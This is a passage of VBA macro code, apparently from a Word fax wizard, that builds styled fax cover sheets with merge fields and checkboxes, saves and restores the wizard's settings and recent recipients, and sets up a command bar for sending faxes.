objRngBuffer1.Style = strSTY_MSG_HDR_LABEL\n    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL\n    \n    'Insert Re:\n    objActiveRange.InsertBefore strRE\n    Set objRngBuffer1 = objActiveRange.Duplicate\n    objActiveRange.InsertAfter vbTab\n    objActiveRange.Collapse wdCollapseEnd\n    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_SUBJECT, False\n    objActiveRange.InsertAfter vbTab\n    objActiveRange.Collapse wdCollapseEnd\n    \n    'Insert CC:\n    objActiveRange.InsertBefore strCC\n    Set objRngBuffer2 = objActiveRange.Duplicate\n    objActiveRange.InsertAfter vbTab\n    objActiveRange.Collapse wdCollapseEnd\n    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False\n\n    objActiveRange.Collapse wdCollapseEnd\n    'set character style for topics\n    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL\n    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL\n    \n    'convert the text into a table\n    objRngTextTable.End = objActiveRange.End\n    objRngTextTable.Select\n    Set objTable = Selection.ConvertToTable(vbTab, 4, 4, AutoFit:=True, Format:=0)\n    With objTable\n        .Borders.Enable = False\n        .Rows.SpaceBetweenColumns = 0\n        If iFaxStyle = iSTY_CONTEMPORARY Then\n            .Rows.LeftIndent = sCONT_LEFT_INDENT\n        Else 'for professional style.\n        'contemporary has autotext entry to insert the lines.\n            Selection.Cells.AutoFit\n            .Columns(2).Width = sCONT_WIDTH_COL1\n            .Columns(4).Width = sCONT_WIDTH_COL1\n            .Rows.Borders(wdBorderHorizontal).Visible = True\n            .Borders(wdBorderBottom).Visible = True\n        End If\n    End With\n    'convert to table inserts a vbCr after the table.\n    InsertCheckBoxes\n    InsertBodyText\n    \n    If iFaxStyle = iSTY_CONTEMPORARY Then\n        Set objActiveRange = ActiveDocument.Content\n        objActiveRange.Collapse wdCollapseStart\n        'Insert title\n        objActiveRange.Style = strSTY_DOC_LABEL\n        objActiveRange.InsertBefore rgstrFaxTitle(iFaxStyle) ' & vbCr\n    '    objActiveRange.Collapse wdCollapseEnd\n    End If\n    Exit Sub\nFatalError:\n    ReportError Err\nEnd Sub\n'creates an elegant style cover sheet\nPrivate Sub CreateElegCoverSheet()\nDim objRngBuffer1 As Range\nDim objRngBuffer2 As Range\nDim strCmpnyName As String, strName As String\nDim strMFFirstName As String, strMFLastName As String, strMFFaxNum As String\nDim objRngTextTable As Range\nDim objTable As Table, objRow As Row\nDim i As Integer\n\n    On Error GoTo FatalError\n    \n    InsertReturnAddress\n    \n    GetMergeFieldNames strMFFirstName, strMFLastName, strMFFaxNum\n    \n    'Insert company name\n    strCmpnyName = formWizard.txtCompany.Text\n    If (Len(strCmpnyName)) Then\n        objActiveRange.Style = strSTY_COMPANY_NAME\n        objActiveRange.InsertBefore strCmpnyName & vbCr\n        objActiveRange.Collapse wdCollapseEnd\n    End If\n    \n    'Insert title\n    objActiveRange.Style = strSTY_DOC_LABEL\n    objActiveRange.InsertBefore rgstrFaxTitle(iFaxStyle) & vbCr\n    objActiveRange.Collapse wdCollapseEnd\n    \n    Set objRngTextTable = objActiveRange.Duplicate\n        \n'the topics To: and From: have a character style which has to be\n'applied after the data has been written (since the data have a\n'different style). so, use a range buffer\n    \n    '1st line text has style \"Message Header First\". The subsequent\n    'lines have \"Message Header\"\n    \n    'Insert To: & From:\n    objActiveRange.Style = strSTY_MSG_HDR_FIRST\n    \n    objActiveRange.InsertBefore strTO & vbTab & strFROM\n    Set objRngBuffer1 = objActiveRange.Duplicate\n    objActiveRange.InsertAfter strSOFT_ENTER\n    objActiveRange.Collapse wdCollapseEnd\n    'Insert textual information in the next line\n    If (iNumRcpnts > 1) Or fDocIsFormLtr Then\n        InsertField objActiveRange, wdFieldMergeField, strMFFirstName, True 'Preserveformatting\n        If Len(strMFLastName) Then\n            objActiveRange.InsertAfter strSPACE\n            objActiveRange.Collapse wdCollapseEnd\n            InsertField objActiveRange, wdFieldMergeField, strMFLastName, True\n        End If\n    ElseIf iNumRcpnts = 1 Then\n        objActiveRange.InsertBefore rgstrRcpntFaxNames(0)\n    Else\n        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False\n    End If\n    \n    'insert name\n    strName = formWizard.txtSenderName.Text\n    If Len(strName) Then\n        objActiveRange.InsertAfter vbTab & strName & vbCr\n    Else\n        objActiveRange.InsertAfter vbTab\n        objActiveRange.Collapse wdCollapseEnd\n        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False\n        objActiveRange.InsertParagraphAfter\n    End If\n\n    objActiveRange.Collapse wdCollapseEnd\n    'set character style for topics\n    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL\n\n    'next 3 lines in \"Message Header\" style\n    'Insert FaxNumber and Date\n    objActiveRange.Style = wdStyleMessageHeader\n    \n    objActiveRange.InsertBefore strFAX_NUMBER & vbTab & strDATE\n    Set objRngBuffer1 = objActiveRange.Duplicate\n    objActiveRange.InsertAfter strSOFT_ENTER\n    objActiveRange.Collapse wdCollapseEnd\n    'Insert textual information in the next line\n    \n    'insert recipient number\n    If (iNumRcpnts > 1) Or fDocIsFormLtr Then\n        InsertField objActiveRange, wdFieldMergeField, strMFFaxNum, True 'Preserveformatting\n    ElseIf iNumRcpnts = 1 Then\n        objActiveRange.InsertBefore rgstrRcpntFaxNums(0)\n    Else\n        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_FAX_NUMBER, False\n    End If\n    objActiveRange.InsertAfter vbTab\n    objActiveRange.Collapse wdCollapseEnd\n    \n    'insert datefield\n    InsertField objActiveRange, wdFieldTime, \"\\@ \" & strQUOTE & strDATE_FORMAT & strQUOTE, True\n    objActiveRange.InsertParagraphAfter\n    objActiveRange.Collapse wdCollapseEnd\n    'set character style for topics\n    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL\n    \n    'Insert CompanyName & Pages\n    objActiveRange.InsertBefore strCOMPANY & vbTab & strTOTAL_NO_PAGES\n    Set objRngBuffer1 = objActiveRange.Duplicate\n    objActiveRange.InsertAfter strSOFT_ENTER\n    objActiveRange.Collapse wdCollapseEnd\n    'Insert company name\n    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_COMPANY, False 'PreserveFormatting\n    objActiveRange.InsertAfter vbTab\n    objActiveRange.Collapse wdCollapseEnd\n\n    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PAGES, False 'PreserveFormatting\n    objActiveRange.InsertParagraphAfter\n    objActiveRange.Collapse wdCollapseEnd\n\n    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL\n    \n    'Phone Number & Re:\n    objActiveRange.InsertBefore strPHONE_NUMBER & vbTab & strRE\n    Set objRngBuffer1 = objActiveRange.Duplicate\n    objActiveRange.InsertAfter strSOFT_ENTER\n    objActiveRange.Collapse wdCollapseEnd\n    \n    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PHONE_NUMBER, False 'PreserveFormatting\n    objActiveRange.InsertAfter vbTab\n    objActiveRange.Collapse wdCollapseEnd\n\n    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_SUBJECT, False 'PreserveFormatting\n    objActiveRange.InsertParagraphAfter\n    objActiveRange.Collapse wdCollapseEnd\n\n    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL\n    \n    'set character style for topics\n    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL\n    \n    'convert the text into a table\n    objRngTextTable.End = objActiveRange.End '- 1 'don't want the last CR\n    objRngTextTable.Select\n    Set objTable = Selection.ConvertToTable(vbTab, 10, 2, Format:=0)\n    objTable.Borders.Enable = False\n    \n    For i = 2 To 8 Step 2\n        Set objRow = objTable.Rows(i)\n        objRow.Range.ParagraphFormat.LeftIndent = 0.25 * 72\n        'don't need the bottom border for the last row.\n        If i <> 8 Then objRow.Borders(wdBorderBottom) = True\n    Next i\n    \n    InsertCheckBoxes\n    InsertBodyText\n    \n    Exit Sub\nFatalError:\n    ReportError Err\nEnd Sub\n\n'Get the names of the merge fields to be inserted in the cover sheet\n'If the original doc. is a form letter then we need to insert the merge fields\n'selected by the user. If not then insert the merge field names we created in the\n'data source we created\nPrivate Sub GetMergeFieldNames(strFirstName As String, strLastName As String, strFaxNum As String)\n    On Error GoTo FatalError\n    \n    If (fDocIsFormLtr) Then\n        'user selects names from drop-down of all possible mergefields in data source\n        strFirstName = formWizard.cboFldsRcpntFirstName.Text\n        strLastName = formWizard.cboFldsRcpntLastName.Text\n        If (strLastName = strNONE) Then strLastName = \"\"\n        strFaxNum = formWizard.cboFldsFaxNum.Text\n    Else\n       strFirstName = strFLD_FAX_NAME\n       strLastName = \"\"\n       strFaxNum = strFLD_FAX_NUMBER\n    End If\n    \n    Exit Sub\nFatalError:\n    ReportError Err\nEnd Sub\nPrivate Sub InsertReturnAddress()\nDim strFromPh As String\nDim strFromFax As String\nDim strText As String, strAddress As String\n\n    On Error GoTo FatalError\n    \n    'Set objActiveRange = ActiveDocument.Content\n    'If iFaxStyle = iSTY_CONTEMPORARY Then objActiveRange.Collapse wdCollapseEnd\n\n    strFromPh = formWizard.txtSenderPhone.Text\n    strFromFax = formWizard.txtSenderFax.Text\n    strAddress = formWizard.txtMailingAddr.Text\n\n    Select Case iFaxStyle\n    \n    Case iSTY_CONTEMPORARY, iSTY_PROFESSIONAL\n        strText = strAddress\n        If Len(strText) Then strText = strText & vbCr\n        If Len(strFromPh) <> 0 Then             strText = strText & strPHONE & strSPACE & strFromPh & vbCr\n\n        If Len(strFromFax) <> 0 Then             strText = strText & strFAX & strSPACE & strFromFax & vbCr\n        If Len(strText) = 0 Then strText = strText & vbCr\n    Case iSTY_ELEGANT\n        strText = StrReplaceCrLfWithText(strAddress, strSPACE & strBULLET & strSPACE)\n        If Len(strText) Then strText = strText & vbCr\n        'if you have phone number\n        If Len(strFromPh) <> 0 Then\n            strText = strText & strPHONE & strSPACE & strFromPh\n            'check if you also have fax\n            'instead of vbCr use space, bullet, space combination\n            If Len(strFromFax) <> 0 Then                 strText = strText & strSPACE & strBULLET & strSPACE & strFAX & strSPACE & strFromFax\n            strText = strText & vbCr\n        'check if you have only Fax\n        ElseIf Len(strFromFax) <> 0 Then\n            strText = strText & strFAX & strSPACE & strFromFax & vbCr\n        End If\n        \n    End Select\n    \n    objActiveRange.Style = strSTY_RETURN_ADDR\n    objActiveRange.InsertBefore strText\n    objActiveRange.Collapse wdCollapseEnd\n    Exit Sub\n    \nFatalError:\n    ReportError Err\nEnd Sub\n'Inserts the check-boxes and the text associated with them\nPrivate Sub InsertCheckBoxes()\nDim i As Integer\nDim R1 As Range\n    On Error GoTo FatalError\n    objActiveRange.Style = strSTY_MSG_HDR_LAST\n    objActiveRange.Collapse wdCollapseEnd\n    Set R1 = objActiveRange.Duplicate\n\n    Set R1 = objWizTemplate.AutoTextEntries(strAT_UNCHKD_BOX).Insert(R1)\n\n    objActiveRange.End = R1.End + 1\n    objActiveRange.Start = R1.End + 1\n    objActiveRange.InsertAfter strSPACE + rgstrChkBoxText(1) + vbTab\n    objActiveRange.Style = wdStyleEmphasis\n\n    objActiveRange.Collapse wdCollapseEnd\n    For i = 2 To 5\n        objActiveRange.FormattedText = R1.FormattedText\n        objActiveRange.Collapse wdCollapseEnd\n        objActiveRange.InsertAfter strSPACE + rgstrChkBoxText(i) + vbTab\n        objActiveRange.Style = wdStyleEmphasis\n        objActiveRange.Collapse wdCollapseEnd\n    Next i\n\n    'delete the previous character i.e the last tab\n    objActiveRange.Start = objActiveRange.End - 1\n    objActiveRange.Delete\n    objActiveRange.InsertParagraph\n    objActiveRange.Collapse wdCollapseEnd\n    Exit Sub\n    \nFatalError:\n    ReportError Err\nEnd Sub\n\nPrivate Sub InsertBodyText()\nDim R1 As Range\nDim strAfterText As String\n    On Error GoTo FatalError\n    \n    If iFaxStyle = iSTY_ELEGANT Then\n        strAfterText = vbCr\n    Else\n        strAfterText = strSPACE & strSPACE\n    End If\n\n    \n    If iFaxStyle = iSTY_PROFESSIONAL Then         objActiveRange.InsertAfter strBULLET\n\n    objActiveRange.InsertAfter rgstrNotes(iFaxStyle) & strAfterText\n    \n    Set R1 = objActiveRange.Duplicate\n    objActiveRange.Collapse wdCollapseEnd\n\n    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_COMMENTS, False 'PreserveFormatting\n    objActiveRange.Style = wdStyleBodyText\n    R1.Style = strSTY_MSG_HDR_LABEL\n    \n    Exit Sub\nFatalError:\n    ReportError Err\nEnd Sub\nPrivate Sub InsertContAutoText()\n\n    On Error GoTo FatalError\n    Set objActiveRange = objWizTemplate.AutoTextEntries(strCNTMPGFX2).Insert(objActiveRange, True)\n   \n    Exit Sub\nFatalError:\n    DisplayErrorMsg strERR_AUTOTEXT_NOT_FOUND\nEnd Sub\n\n\nPublic Sub RestoreDialogValues(fDummy As Boolean)\n    Dim fAddrBkEnable As Boolean\n    Dim i As Integer\n    Dim strChkdAddr As String\n    \n    On Error GoTo FatalError\n    StatusBar = strRST_SETTINGS\n    Application.ScreenUpdating = False\n    System.Cursor = wdCursorWait\n   \n    fAddrBkEnable = Application.MAPIAvailable\n    formWizard.cmdRcpntsAddrBk.Enabled = fAddrBkEnable\n    formWizard.cmdSenderAddrBk.Enabled = fAddrBkEnable\n    \n'Setting options in Panel1 depending on whether a doc. is present or not\n    If fDocPresent Then\n        formWizard.optCurDoc.Value = True\n        formWizard.optCurDocCovShtYes.Value = True\n    Else\n        'disable a bunch of options\n        formWizard.optCurDoc.Enabled = False\n        formWizard.cboDocList.Enabled = False\n        formWizard.optCurDocCovShtNo.Enabled = False\n        formWizard.optCurDocCovShtYes.Enabled = False\n        formWizard.optCovSht.Value = True\n        formWizard.frmRcpntsFormDoc.Visible = False\n        formWizard.frmRcpntsOrdDoc.Visible = True\n    \n    End If\n\n    'Panel2\n    'read values from registry.\n    iFaxOption = IRestorePref(\"Fax Option\", 0)\n    If InStr(UCase$(System.OperatingSystem), \"NT\") Then\n        fMSFAXEnabled = False\n        formWizard.optMSFax.Enabled = False\n    Else\n        fMSFAXEnabled = True\n    End If\n    'set printer in combo-box before disabling frmFaxDriver.\n    GetAllPrinters\n        \n    'the controls are assumed to be enabled initially and are explicityly\n    'only turned off, never turned on.\n    If (iFaxOption = iMS_FAX) And Not (fMSFAXEnabled) Then\n        If iTotalNumPrinters > 0 Then\n            iFaxOption = iDIFF_FAX\n        Else\n            iFaxOption = iNO_FAX\n        End If\n    End If\n    Select Case iFaxOption\n        Case iMS_FAX:\n            formWizard.optMSFax.Value = True\n            formWizard.cboFaxDriver.Enabled = False\n            formWizard.lblFaxDriver.Enabled = False\n            formWizard.cmdOtherPrinters.Enabled = False\n        Case iDIFF_FAX:\n            formWizard.optDifferentFax.Value = True\n        Case iNO_FAX:\n            formWizard.optNoFax.Value = True\n            formWizard.cboFaxDriver.Enabled = False\n            formWizard.lblFaxDriver.Enabled = False\n            formWizard.cmdOtherPrinters.Enabled = False\n        Case Else\n            iFaxOption = iNO_FAX\n            formWizard.optNoFax.Value = True\n            formWizard.cboFaxDriver.Enabled = False\n            formWizard.lblFaxDriver.Enabled = False\n            formWizard.cmdOtherPrinters.Enabled = False\n            \n    End Select\n    \n    'Panel3\n    fRegistryNamesRead = False\n    \n    'Panel5\n    formWizard.txtSenderName.Text = Application.UserName\n\n    i = ICountLines(Application.UserAddress, strChkdAddr, iMAX_ADDR_LINES)\n    formWizard.txtMailingAddr.Text = strChkdAddr\n    formWizard.txtSenderFax.Text = StrRestorePref(\"Sender Fax\", \"\")\n    formWizard.txtSenderPhone.Text = StrRestorePref(\"Sender Phone\", \"\")\n    \n    'Panel 4\n    iFaxStyle = IRestorePref(\"Coversheet Style\", 0)\n    If (iFaxStyle < iSTY_PROFESSIONAL) Or (iFaxStyle > iSTY_ELEGANT) Then         iFaxStyle = iSTY_PROFESSIONAL\n    Select Case iFaxStyle\n        Case iSTY_PROFESSIONAL\n            formWizard.optStyleProf.Value = True\n            formWizard.lblStyle0.Visible = True\n        Case iSTY_CONTEMPORARY\n            formWizard.optStyleCont.Value = True\n            formWizard.lblStyle1.Visible = True\n        Case iSTY_ELEGANT\n            formWizard.optStyleEleg.Value = True\n            formWizard.lblStyle2.Visible = True\n    End Select\n    \n    On Error GoTo -1 'reset error trap\n    On Error Resume Next\n    formWizard.txtCompany.Text = System.PrivateProfileString(\"\", strREGKEY_CMPNY_NAME, strVALKEY_CMPNY_NAME)\n    fSettingsRestored = True\n    System.Cursor = wdCursorNormal\n    StatusBar = \"\"\n    Application.ScreenUpdating = True\n\n    Exit Sub\n    \nFatalError:\n    ReportError Err\nEnd Sub\n\n'sets default merge fields\nPublic Sub FillMergeFields(fDummy As Boolean)\nDim i As Integer, iCount As Integer\nDim iFirstName As Integer\nDim iLastName As Integer\nDim iFax As Integer\nDim rgstrNames() As String\nDim objFieldNames As MailMergeFieldNames\nDim objTempDoc As Document\n\n    On Error GoTo FatalError\n    iFirstName = -1\n    iLastName = -1\n    iFax = -1\n    \n    'reset the query options so that all names in the data src are selected\n    \n    Set objFieldNames = objDataSrc.FieldNames\n    iCount = objFieldNames.Count\n    ReDim rgstrNames(iCount - 1)\n    For i = 1 To iCount\n        rgstrNames(i - 1) = objFieldNames(i).Name\n        If InStr(rgstrNames(i - 1), strFLD_NAME) Then\n            If iFirstName = -1 Then\n                iFirstName = i - 1\n            ElseIf iLastName = -1 Then\n                iLastName = i - 1\n            End If\n        ElseIf InStr(rgstrNames(i - 1), strFLD_FAX) Then\n            If iFax = -1 Then iFax = i - 1\n        End If\n        \n    Next i\n    \n    formWizard.cboFldsRcpntFirstName.List = rgstrNames\n    formWizard.cboFldsRcpntLastName.List = rgstrNames\n    formWizard.cboFldsFaxNum.List = rgstrNames\n    \n    formWizard.cboFldsRcpntFirstName.AddItem strNONE\n    formWizard.cboFldsRcpntLastName.AddItem strNONE\n    \n    If (iFirstName <> -1) Then\n        formWizard.cboFldsRcpntFirstName.Value = rgstrNames(iFirstName)\n    Else\n        formWizard.cboFldsRcpntFirstName.Value = strNONE\n    End If\n        \n    If (iLastName <> -1) Then\n        formWizard.cboFldsRcpntLastName.Value = rgstrNames(iLastName)\n    Else\n        formWizard.cboFldsRcpntLastName.Value = strNONE\n    End If\n        \n    If (iFax <> -1) Then         formWizard.cboFldsFaxNum.Value = rgstrNames(iFax)\n\n    Exit Sub\n    \nFatalError:\n    ReportError Err\nEnd Sub\n\n'retrieves the Names and numbers stored in registry.\nSub ReadRegistryFaxNames(fDummy As Boolean)\nDim j As Integer, k As Integer\nDim objCtrls As Object\n    On Error GoTo FatalError\n    fRegistryNamesRead = True\n    Set objCtrls = formWizard.mpgWizardPage.Pages(iPANEL_RCPNTS).Controls\n    \n    For j = 1 To iMAX_RCPNTS\n        rgstrMRUFaxNames(j - 1) = StrRestorePref(strRCPNT_NAME & j, \"\")\n        rgstrMRUFaxNums(j - 1) = StrRestorePref(strRCPNT_NUMBER & j, \"\")\n    Next j\n        \n    \n    For j = 0 To iMAX_RCPNTS - 1\n        objCtrls(strCBO_RCPNT_NAME & j).List = rgstrMRUFaxNames\n        objCtrls(strCBO_RCPNT_NUM & j).List = rgstrMRUFaxNums\n    Next j\n    \n    Exit Sub\n    \nFatalError:\n    ReportError Err\nEnd Sub\nSub SaveDialogValues(fDummy As Boolean)\n    On Error GoTo FatalError\n    \n    StatusBar = strSAVE_SETTINGS\n    Application.ScreenUpdating = False\n    System.Cursor = wdCursorWait\n    \n    System.PrivateProfileString(\"\", strREG_SETTINGS_BASE_KEY, strREG_ASSISTANT_TIME_STAMP) = Format$(Now, \"General Date\")\n    StoreValPref strREG_ASSISTANT_HELP, iLocalState\n    \n    StorePref \"Fax Option\", CStr(iFaxOption)\n    If iFaxOption = iDIFF_FAX Then         StorePref \"Fax Driver\", formWizard.cboFaxDriver.Text\n    \n    StorePref \"Sender Fax\", formWizard.txtSenderFax.Text\n    StorePref \"Sender Phone\", formWizard.txtSenderPhone.Text\n    StorePref \"Coversheet Style\", CStr(iFaxStyle)\n    \n    If Not (fDocIsFormLtr) Then SaveRcpntsInRegistry\n    \n    fSettingsSaved = True\n    System.Cursor = wdCursorNormal\n    StatusBar = \"\"\n    Application.ScreenUpdating = True\n\n    Exit Sub\n    \nFatalError:\n    ReportError Err\nEnd Sub\n\n'stores the recipient names and numbers of iMAX_RCPNTS recipients.\n'The name is tagged to the number. So, you can have a number without a name\n'but not a name without a number\nPrivate Sub SaveRcpntsInRegistry()\n'Dim strName As String\nDim strNum As String\nDim i As Integer, j As Integer, k As Integer\nDim objCtrls As Object\n\n    On Error GoTo FatalError\n    k = 0\n    'initialize the arrays so that even if the user has not\n    'chosen any recipient we can still use the first entry of the arrays.\n    rgstrRcpntFaxNames(0) = \"\"\n    rgstrRcpntFaxNums(0) = \"\"\n    iNumRcpnts = 0\n    \n    Set objCtrls = formWizard.mpgWizardPage.Pages(iPANEL_RCPNTS).Controls\n    \n    For i = 0 To iMAX_RCPNTS - 1\n        strNum = StrSearchReplace(objCtrls(strCBO_RCPNT_NUM & i).Text, vbTab, \" \") 'recipient number\n        If (Len(strNum)) Then 'if number not empty\n            rgstrRcpntFaxNums(k) = strNum 'store number\n            rgstrRcpntFaxNames(k) = StrSearchReplace(objCtrls(strCBO_RCPNT_NAME & i).Text, vbTab, \" \") 'and corresponding name\n            k = k + 1\n            StorePref strRCPNT_NUMBER & k, strNum 'store number\n            StorePref strRCPNT_NAME & k, rgstrRcpntFaxNames(k - 1)\n \n            j = objCtrls(strCBO_RCPNT_NUM & i).ListIndex\n            \n            'user selected one of the choices\n            If j <> -1 Then rgstrMRUFaxNums(j) = \"\"  'already picked up this text\n        End If\n    Next i\n    \n    iNumRcpnts = k\n    \n    j = 0\n    While (k < iMAX_RCPNTS) 'if we haven't yet iMAX_RCPNTS names\n        'go through the array of orginally obtained recipients and\n        'store which haven't yet been stored\n        While ((j < iMAX_RCPNTS) And (Len(rgstrMRUFaxNums(j)) = 0))\n            j = j + 1\n        Wend\n        \n        If j = iMAX_RCPNTS Then\n            GoTo LReturn 'no names left to fill\n        Else\n            k = k + 1\n            StorePref strRCPNT_NAME & k, rgstrMRUFaxNames(j) 'store name\n            StorePref strRCPNT_NUMBER & k, rgstrMRUFaxNums(j) 'and corresponding number\n            rgstrMRUFaxNums(j) = \"\"\n        End If\n    Wend\n\nLReturn:\n    Exit Sub\nFatalError:\n    ReportError Err\nEnd Sub\n\n'Error will be taken care of in SetupDocForFax\n'Cover sheet is deleted after faxing if no cover sheet is opted by user. So,\n'Activedocument is new cover sheet doc.\nPrivate Sub SaveRcpntsInDocVars(fSaveRcpnts As Boolean)\nDim i As Integer\nDim objVars As Variables\nDim strTemp As String, strFaxFld As String\n\n    Set objVars = ActiveDocument.Variables\n    objVars.Add strNUM_RCPNTS, iNumRcpnts\n    \n    If fSaveRcpnts Then\n        If (iNumRcpnts > 0) Then\n            For i = 1 To iNumRcpnts\n                objVars.Add strRCPNT_NAME & i, rgstrRcpntFaxNames(i - 1)\n                objVars.Add strRCPNT_NUMBER & i, rgstrRcpntFaxNums(i - 1)\n            Next i\n        End If\n    End If\n    \n    If (fNoCovSht) Then\n        objVars.Add \"Cover Sheet Present\", \"0\"\n    Else\n        objVars.Add \"Cover Sheet Present\", \"1\"\n    End If\n    \n    strFaxFld = \" \"\n    'store what fax option user chose.\n    If (iFaxOption = iDIFF_FAX) Then\n        objVars.Add \"MS Fax Present\", \"0\"\n        objVars.Add \"Fax Printer\", formWizard.cboFaxDriver.Text\n    Else\n        objVars.Add \"MS Fax Present\", \"1\"\n        If fDocIsFormLtr Then\n            strFaxFld = formWizard.cboFldsFaxNum.Value\n        Else\n            strFaxFld = strFLD_FAX_NUMBER\n        End If\n    End If\n    \n    objVars.Add \"Fax Field Name\", strFaxFld\n\n    'if doc. is present and is to be faxed then store relevant info. about doc.\n    If (fDocPresent And (Not (formWizard.optCovSht.Value))) Then\n        objVars.Add \"Main Doc Present\", \"1\"\n        objVars.Add \"Main Document Name\", objMainDoc.Name\n        \n        'is the field a fax number or an Address Book Entry???\n        If (fDocIsFormLtr) Then objVars.Add \"Through Email\",                 formWizard.optFldFaxEntry.Value\n\n    Else\n        \n        objVars.Add \"Main Doc Present\", \"0\"\n    \n    End If\n    \nEnd Sub\n\n\n'removes vbCR & vbLF from the end of the string\n'until the last character is not a vbLf or vbCr\nPublic Function StrRemoveCrLfFromEnd(strText As String) As String\n    Dim strChar As String\n    Dim i As Integer\n\n    i = Len(strText)\n    If (i = 0) Then GoTo LEnd\n\n    strChar = Mid$(strText, i, 1)\n    'check for the last character\n    While (strChar = vbLf) Or (strChar = vbCr)\n        i = i - 1\n        strChar = Mid$(strText, i, 1)\n    Wend\n    \nLEnd:\n    StrRemoveCrLfFromEnd = Left$(strText, i)\nEnd Function\n'counts the number of lines in a string\nPublic Function ICountLines(ByVal strWhat As String, strNewText As String, iMax As Integer) As Integer\n    Dim cLines As Integer, iPos As Integer\n    \n    strNewText = \"\"\n    cLines = 0\n    iPos = InStr(strWhat, vbCr)\n    While iPos\n        If iPos < Len(strWhat) Then\n            If cLines < iMax Then strNewText = strNewText & Left$(strWhat, iPos - 1)\n            cLines = cLines + 1\n            strWhat = Mid$(strWhat, iPos + 1)\n            iPos = InStr(strWhat, vbCr)\n        Else\n            If cLines < iMax Then strNewText = strNewText & Left$(strWhat, iPos - 1)\n            If Len(strWhat) > 1 Then cLines = cLines + 1\n            strWhat = \"\"\n            iPos = 0\n        End If\n    Wend\n    If strWhat <> \"\" Then\n        If cLines < iMax Then strNewText = strNewText & strWhat\n        cLines = cLines + 1\n    End If\n    \n    ICountLines = cLines\n\nEnd Function  ' CountLines\n\n'inserts a field of type iFldType at the given range with strText as the text. Field replaces the text in objRng\n'so pass a collapsed range always.and updates the range to be at the end\n'of the inserted field.\nPrivate Sub InsertField(objRng As Range, iFldType, strText As String, fPreserveFormatting)\n    Dim objFld As Field\n    \n    On Error GoTo FatalError\n\n    Set objFld = objRng.Fields.Add(objRng, iFldType, strText, fPreserveFormatting)\n    \n    Set objRng = objFld.result\n    With objRng\n        .Collapse wdCollapseEnd\n        .End = .End + 1\n        .Start = .End\n    End With\n    \n    Exit Sub\nFatalError:\n    ReportError Err\n    \nEnd Sub\n'replaces all occurences of vbCR & vbLF with the delimiter string in strText\n'returns the new string\nPrivate Function StrReplaceCrLfWithText(strText As String, strDelim As String) As String\n    Dim strRet As String, strTmp As String\n    \n    strRet = \"\"\n    strTmp = strText\n    If Len(strTmp) = 0 Then GoTo LEnd\n    \n    strRet = StrRemoveCrLfFromEnd(strTmp)\n    'remove vbLf thro' search and replace\n    strTmp = StrSearchReplace(strRet, vbLf, \"\")\n    'now replace all occurrences of vbCr with strDelim\n    strRet = StrSearchReplace(strTmp, vbCr, strDelim)\nLEnd:\n    StrReplaceCrLfWithText = strRet\n\nEnd Function\n\n'removes the character strSrch from strText.\n'caller should make sure that strSrch is a one character string\n'returns the string stripped off the character\nPrivate Function StrSearchReplace(strText As String, strSrch As String, strReplace As String)\n    Dim strRet As String, strTmp As String\n    Dim iPos As Integer\n    \n    strRet = \"\"\n    strTmp = strText\n\n    iPos = InStr(strTmp, strSrch)\n    \n    While (iPos) 'presence of strChar\n        strRet = strRet & Left$(strTmp, iPos - 1)\n        If (iPos < Len(strTmp)) Then\n            strRet = strRet & strReplace\n            strTmp = Mid$(strTmp, iPos + 1)\n            iPos = InStr(strTmp, strSrch)\n        Else 'strSrch is the last character\n            strTmp = \"\"\n            iPos = 0\n        End If\n    Wend\n        \n    'append whatever is left of the original string\n    strRet = strRet & strTmp\n\n    StrSearchReplace = strRet\nEnd Function\n\n'Errors in SaveRcpntsInDocVars & CreateCmdBar gets propagated back\n'this function\nPublic Sub SetupDocForFax(fDummy As Boolean)\n    On Error GoTo FatalError\n\n    If iFaxOption = iNO_FAX Then Exit Sub\n\n    If (Not (fDocIsFormLtr)) And (iNumRcpnts = 0) And (iFaxOption = iMS_FAX)             Then Exit Sub\n        \n    'dont save recipient info for form letter\n    SaveRcpntsInDocVars (Not (fDocIsFormLtr))\n    \n    If (fNoCovSht) Then 'fax the doc.\n        If (Not (fDocIsFormLtr)) Then\n            FaxRegDoc\n        Else\n            FaxFormLtr\n        End If\n    Else\n        CreateCmdBar\n    End If\n\n    Exit Sub\nFatalError:\n    DisplayErrorMsg strERR_CREATING_CMDBAR\n    ReportError Err\nEnd Sub\n'Error will be taken care of in SetupDocForFax\nPrivate Sub CreateCmdBar()\nDim objCmdBar As CommandBar\nDim objBtn As CommandBarButton\n\n    Application.CustomizationContext = ActiveDocument\n    Set objCmdBar = Application.CommandBars.Add(strCMD_BAR_TITLE, Position:=msoBarFloating, Temporary:=True)\n\n    'Add a button\n    Set objBtn = objCmdBar.Controls.Add(msoControlButton, Temporary:=True)\n    objBtn.Style = msoButtonCaption\n    objBtn.Caption = strCMD_BTN_TEXT\n    \n    If (Not (fDocIsFormLtr)) Then\n        objBtn.OnAction = \"Fax.FaxRegDoc\"\n    Else\n        objBtn.OnAction = \"Fax.FaxFormLtr\"\n    End If\n    \n    objCmdBar.Visible = True\n    \n    fCreatedCmdBar = True\n    Exit Sub\n\nEnd Sub\n\n'Cover sheet is deleted after faxing if no cover sheet is opted by user. So,\n'Activedocument is new cover sheet doc.\nPrivate Sub FaxRegDoc()\n\nDim fMSFax As Boolean\nDim fCovSht As Boolean\nDim iNumRcpnts As Integer\nDim 